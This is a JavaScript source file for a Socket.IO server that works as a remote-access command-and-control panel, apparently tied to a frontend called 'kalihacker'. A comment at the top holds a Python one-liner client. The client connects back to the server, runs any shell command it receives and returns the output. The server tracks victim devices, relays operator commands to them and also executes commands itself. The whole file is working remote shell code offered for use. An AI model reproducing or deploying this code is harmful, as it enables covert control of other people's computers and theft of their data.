//python -c "import socketio, subprocess, os; sio=socketio.Client(); sio.connect('http://localhost:5000'); sio.on('execute-command', lambda cmd: sio.emit('shell-output', {'clientId': sio.sid, 'output': subprocess.getoutput(cmd) if not cmd.startswith('cd ') else (os.chdir(cmd.split(' ', 1)[1]) or f'Changed directory to {os.getcwd()}')})); sio.wait()"
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const { execSync } = require('child_process'); // Import execSync for synchronous command execution

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "https://kalihacker.netlify.app:3000", // Adjust to your frontend URL
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
    credentials: true
  }
});

app.use(cors()); // Enable CORS for all routes

const clients = {};
const clientDirectories = {}; // Store directories for each client

io.on('connection', (socket) => {
  console.log(`New client connected: ${socket.id}`);
  clients[socket.id] = socket;
  clientDirectories[socket.id] = process.cwd(); // Initialize client's working directory

  // Send the updated client list
  io.emit('clients', Object.keys(clients).map(id => ({
    id,
    deviceInfo: clients[id].deviceInfo
  })));

  socket.on('device-info', (data) => {
    clients[socket.id].deviceInfo = data.deviceInfo;
    console.log(`Device info for client ${socket.id}:`, data.deviceInfo);
  });

  socket.on('send-command', (data) => {
    const { clientId, command } = data;
    console.log(`Sending command to ${clientId}: ${command}`);

    // Send the command to the specified client
    if (clients[clientId]) {
      clients[clientId].emit('execute-command', command);
    }
  });

  // Listen for the shell output from the client
  socket.on('shell-output', (data) => {
    const { clientId, output } = data; // Assuming data contains clientId and output
    console.log(`Received shell output from ${clientId}:`, output);

    // Emit the shell output back to the frontend
    io.emit('shell-output', output);
  });

  socket.on('execute-command', (command) => {
    const currentDir = clientDirectories[socket.id]; // Get the current directory for the client
    let output;

    // Check if command is a cd command
    if (command.startsWith('cd ')) {
      const newDir = command.split(' ')[1];
      try {
        process.chdir(newDir); // Change the current working directory
        clientDirectories[socket.id] = process.cwd(); // Update the client's directory
        output = `Changed directory to ${process.cwd()}`;
      } catch (err) {
        output = `Error changing directory: ${err.message}`;
      }
    } else {
      try {
        output = execSync(command, { cwd: currentDir, stdio: 'pipe' }).toString(); // Execute command in the current directory
      } catch (error) {
        output = `Error executing command: ${error.message}`;
      }
    }

    // Emit the shell output back to the client
    socket.emit('shell-output', { clientId: socket.id, output });
  });

  socket.on('disconnect', () => {
    console.log(`Client disconnected: ${socket.id}`);
    delete clients[socket.id];
    delete clientDirectories[socket.id]; // Remove client's directory on disconnect
    // Send the updated client list
    io.emit('clients', Object.keys(clients).map(id => ({
      id,
      deviceInfo: clients[id].deviceInfo
    })));
  });
});

const PORT = 5000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
